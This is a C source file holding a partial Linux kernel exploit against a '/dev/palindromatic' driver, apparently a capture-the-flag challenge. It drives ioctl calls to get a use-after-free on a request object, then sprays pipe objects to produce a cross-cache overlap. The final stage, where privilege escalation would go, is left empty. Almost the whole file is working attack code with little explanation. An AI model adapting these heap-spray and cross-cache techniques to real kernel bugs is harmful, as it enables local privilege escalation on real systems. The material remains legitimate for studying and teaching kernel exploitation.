#define _GNU_SOURCE                                   
#include <stdio.h>                                    
#include <string.h>                                   
#include <unistd.h>                                   
#include <stdlib.h>                                   
#include <stdint.h>                                   
#include <fcntl.h>
#include <sched.h>                                    
#include <pthread.h>                                  
#include <byteswap.h>                                 
#include <poll.h>                                     
#include <assert.h>                                   
#include <signal.h>
#include <sys/wait.h>
#include <sys/syscall.h>
#include <sys/mman.h>
#include <sys/timerfd.h>
#include <sys/ipc.h>
#include <sys/msg.h>

// utils
#define STRING_SZ 0x1F8
#define QUEUE_SZ  0x100
enum { 
    QUEUE = 0xb10500a,
    SANITIZE,
    RESET,
    PROCESS,
    REAP,
    QUERY
};

enum {
    RAW = 0x1337,
    SANITIZED,
    PALINDROME,
    NONPALINDROME
};

int ioctl(int fd, int req, unsigned long param) { return syscall(__NR_ioctl, fd, req, param); }
void log(char* logmsg){ printf("[*] %s\n", logmsg); }
void stop(){ log("PAUSED"); getchar();}
void error(char* errormsg){
    printf("[!] ERROR: %s\n",errormsg);
    exit(-1);
}

void setaff(int cpu){
    cpu_set_t my_set;
    CPU_ZERO(&my_set);
    CPU_SET(cpu, &my_set);
}


// exploit related constants
#define PM_SPRAY 0x100
#define PIPE_SPRAY_1 0x160
#define PIPE_SPRAY_2 0x20

int fd;
char* tmp = "";
int pipefds1[PIPE_SPRAY_1][2];
int pipefds2[PIPE_SPRAY_2][2];

void add_request(char* str){ if (ioctl(fd,QUEUE,(unsigned long)&str) == -1) error("add_request()"); }
void sanitize_request(){ if (ioctl(fd,SANITIZE,(unsigned long)&tmp) == -1) error("sanitize_request()"); }
void reset_request() { if (ioctl(fd,RESET,(unsigned long)&tmp) == -1) error("reset_request()"); }
void process_request(){ if (ioctl(fd,PROCESS,(unsigned long)&tmp) == -1) error("process_request()"); }
long query_capacity(){ return ioctl(fd,QUERY,(unsigned long)&tmp); }
long reap_request() {
    long ret = ioctl(fd,REAP,(unsigned long)&tmp);
    if (ret == -1) error("reap_request()");
    else return ret;
}

int main(){
    fd = open("/dev/palindromatic", O_RDONLY);
    if (fd == -1) error("CAN'T OPEN DEVICE");

    setaff(0);

    // Stage 1: Get UAF request 
    char buf[STRING_SZ+1];
    memset(buf,'A',STRING_SZ);

    for (int i=0; i < PM_SPRAY; i++)
        add_request(buf);

    // make a corrupted request (sanitize can only be called once)
    sanitize_request();


    // find the corrupted request
    int n = query_capacity() & 0xffff;
    for (int i=0; i < PM_SPRAY; i++){
        // check if request is corrupted
        process_request();
        n++;
        
        // check if current income queue size is smaller than its supposed to be
        if ((query_capacity() & 0xffff) == (n-1)){
            // found corrupted request
            reset_request(); // put the request to the back of incoming_queue
            n = i;
            log("FOUND CORRUPTED REQUEST");
            break;
        } 
    }

    // clear away the rest of the requests in incoming_queue, only leaving the corrupted request
    for (int i = n+1; i < PM_SPRAY; i++) process_request();

    // clear out the outgoing_queue, freeing everything
    // so now we have a free chunk in incoming_queue;
    for (int i=0; i < PM_SPRAY; i++) reap_request();


    //stop(); // to find corrupted request ptr in gdb
       
    // Stage 2: Cross-Cache UAF
    // spray pipe objects
    for (int i=0; i < PIPE_SPRAY_1; i++){
        pipe(pipefds1[i]);
        write(pipefds1[i][1],"BBB",3);
    }

    //stop(); // test if there's a pipe object allocated at the corrupted request

    // use our UAF in incoming_queue to free the pipe object
    reset_request();
    reset_request(); // why have to double reset tho?

    // spray pipe objects again to get an overlap, so that two pipe objects occupy the same memory space
    for (int i=0; i < PIPE_SPRAY_2; i++){
        pipe(pipefds2[i]); // got to store the pipefds so that we can free everything later
        write(pipefds2[i][1],"CCC",3);
    }
    
    // find corrupted pipe
    char resp;
    for (int i=0; i < PIPE_SPRAY_1; i++){
        read(pipefds1[i][0],&resp,1);
        
        if (resp == 'C') {
            printf("[*] FOUND CORRUPTED PIPE: PIPE %d\n",i);
            break;
        }
    }


    // Stage 3: 
    
    
    return 0;
}
